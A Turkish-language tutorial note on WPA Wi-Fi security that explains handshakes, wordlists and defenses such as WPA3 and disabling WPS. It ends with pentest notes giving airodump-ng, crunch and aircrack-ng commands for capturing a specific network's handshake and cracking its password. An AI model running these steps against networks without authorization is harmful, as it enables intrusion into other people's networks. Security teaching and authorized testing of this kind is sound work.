# WPA Güvenliği ve Kablosuz Ağ Saldırı Mantığı (Genel Bakış)

1. WPA (Wi-Fi Protected Access) Nedir?

WPA (Wi-Fi Protected Access), kablosuz ağlarda veri iletimini şifrelemek ve kullanıcı kimlik doğrulaması sağlamak için kullanılan bir güvenlik protokolüdür.

Amaç:
• Yetkisiz erişimi engellemek
• Trafiği şifrelemek
• Ağ bütünlüğünü korumak

2. Handshake (El Sıkışma) Nedir?

Kablosuz bir ağa (Wi-Fi) bağlanmak isteyen bir cihaz ile modem (router) arasında yapılan kimlik doğrulama işlemidir.

3. Wordlist Mantığı

Siber güvenlikte ve özellikle brute-force saldırılarında kullanılan, içinde şifre olabilecek kelimelerin (parola tahminlerinin) bulunduğu metin dosyasıdır (.txt).

5. Savunma Yöntemleri

Güçlü parola kullanımı
• En az 12–16 karakter
• Rastgele karakter kombinasyonu

WPA3 kullanımı

WPA3
• Brute-force saldırılarına karşı daha dayanıklıdır

WPS kapatma
• Otomatik PIN sistemleri saldırıya açıktır

MAC filtreleme (ek güvenlik katmanı)
• Sadece izinli cihazlar bağlanabilir

Güncel firmware
• Router açıklarını kapatır

## WPA/Wi-Fi Güvenlik Analizi (Eğitim Amaçlı Pentest Notları)

- > iwconfig //monitor moda geç
- > airodump-ng wlan0mon //ağ bilgileri al
- > airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon // Handshake paketi yakalanır ve çıktı dosyasına kaydedilir. Eğer pasif dinleme sırasında elde edilemezse, yeniden kimlik doğrulama sürecinin oluşmasını sağlayacak ek test senaryoları uygulanarak veri toplama tamamlanır.

//Crunch kurulur

- > crunch 8 9 xy123 -o testwordlist // 8-9 haneli password, içerisinde xy123 geçen parola kombinasyon listesi oluşturulur.

- > aircrack-ng handshake-file-01.cap -w testwordlist // Toplanan dosyalar eklenir, Amaç, zayıf parola kullanımının test edilmesidir. Wifi parolası bulmaya çalışır.
